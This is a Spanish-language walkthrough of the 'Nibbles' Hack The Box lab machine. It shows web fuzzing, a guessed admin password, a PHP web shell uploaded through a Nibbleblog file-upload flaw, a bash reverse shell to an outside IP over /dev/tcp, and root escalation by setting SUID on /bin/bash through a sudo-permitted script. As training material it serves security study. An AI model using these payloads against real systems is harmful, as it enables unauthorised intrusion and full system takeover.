## Summary

- IP -> 10.10.10.75
- Ports -> TCP (22,80), UDP (idk)
- OS ->  Linux
- Services & Applications
    - 22 -> OpenSSH 7.2p2  
    - 80 -> Apache httpd 2.4.18 

## Recon
Podemos enumerar usuarios con ese version de SSH, ya que es inferior a la version **7.7** 
Buscaremos con el codename **OpenSSH 7.2p2 ubuntu 4ubuntu2.2 launchpad** y veremos que version de Linux es: Xenial
Buscaremos con el codename **apache httpd 2.4.18 launchpad** y veremos que version de Linux es: Xenial
- Comando -> **whatweb http://< URL>**  Nos dara una breve descripcion del gestor de contenidos del puerto 80
En el Wapalyzer miramos que tiene un PHP, y jQuery 2.1.0 que esta desactualizado. La ultima version de jQuery es **3.6.3**

- Cuando tenemos un **PHP** quiere decir que nos interpreta ese codigo, por tanto no lo veriamos, el que podriamos llegar  a ver seria el de **HTML**.

- Que es Nibbleblog? Es un CMS para crear blogs sin usar bases de datos

En el codigo de la web **Ctrl + u** encontramos una ruta **/nibbleblog** y mirams que hay. Por lo que creemos que hay mas rutas. Por ende nos ponemos a hacer un FUZZ

- **wfuzz -c --hc=404 -t 200 -w /usr/share/Seclists/Discovery/Web-content/directory-list-2.3-medium.txt http://10.10.10.75/nibbleblog/FUZZ** Para descibrir rutas alternativas
- **wfuzz -c --hc=404 -t 200 -w /usr/share/Seclists/Discovery/Web-content/directory-list-2.3-medium.txt http://10.10.10.75/nibbleblog/FUZZ.php** Para descubrir archivos php y encontramos un admin.php (Panel de autenticacion)

En el panel de autenticacion ya habiamos descubierto que si hya un usuario valido llamado admin, por lo que la password seria igual que como se llama la maquina nibbles. Y asi logramos entrar en la Web. 

- **Searchsploit Nibbleblogs** y descubrimos que hay una version que es igual a la de la pagina web 4.0.3 que es vulnerable a Arbitrary File Upload 
- searchsploit -x 15265.txt Para mirar el contenido del exploit

Miramos que hay una ruta en la pagina web en donde podemos subir archivos 

En el cual subiremos el siguiente que sera en php.
nano cmd.php
	<?p 
		echo "<pre>" . shell_exec($_REQUEST['cmd']) . "</pre>";
	 ?>
El cual cuando lo ejecute, nosotros podamos ejecutar comandos
Este archivo lo subimos en **Pluggins::My images** de la pagina Web
La ruta en la url en donde los guarda es **/nibbleblog/content/private/pluggis/my_images**

## User
Ahora podemos ejecutar comando remotos colocando esto al final de la url **?cmd=whoami**
por lo que hacemos lo siguiente:

- Comando -> **nc -nlvp 443** Nos ponemos en escucha por el puerto 443
En la url escribimos lo siguiente /image.php?cmd=**bash -c "bash -i >& /dev/tcp/10.10.14.17/443 0>&1"** Esto nos dara la revershell a nuesta IP
Colocamos lo anterior en url-encode para que nos marque algun error:
- **bash -c "bash -i >%26 /dev/tcp/10.10.14.17/443 0>%261"** 

Y ya entramos a la maquina victima. Por lo que ahora hacemos tratamiento de la tty
-
Tratamiento de la consola Linux cuando entras a una maquina victima
 **Script /dev/null -c bash** Nos sales que esto no se puede hacer, por lo que hacemos lo siguiente
 **Ctrl + z**
 **stty raw -echo; fg**
 **reset xterm**

Despues cambiamos esto para poder hacer Ctrl+ l y Ctrl + c
**echo $SHELL** Para ver la ruta de shell y ver que valor tiene **/usr/bin/nologin**
**export SHELL=bash** Hacemos que shell ahora valga bash
**export TERM=xterm**

Ahora para modificar las dimensiones de nano debemos hacer lo siguiente.
**stty size** Con este comando podemos ver las dimensiones de la consola nano de 24 80 por lo que debemos de modificar ese valor a este
**stty rows 51 columns 189** Modificamos las dimenesiones de la consola nano

-
Despues buscamos la primer flag -> user.txt

## Root

- **sudo -l** Tenemos un privilegio a nivel de sudoers
-Nos debemos de crear una ruta y un archivo con extension .sh que el cual al momento de escribirle algo lo podremos ejecutar como root y asi ganaremos acceso. 

nano monitor.sh 
	#!/bin/bash
	chmod u+s /bin/bash

Con este script queremos que nos ejecute este script con un permiso suid a la bash

- **sudo -u root /home/nibbler/personal/stuff/monitor.sh** Haremos que root no ejecute ese script ya que solo ahi podemos ejecutar con ese privilegio de root y nos dara una S -> privilegio suid 
- **bash -p**  (p=priviledge) y que me de la bash de forma temporal como root y listo 
Ahora solo queda buscar la flag root.txt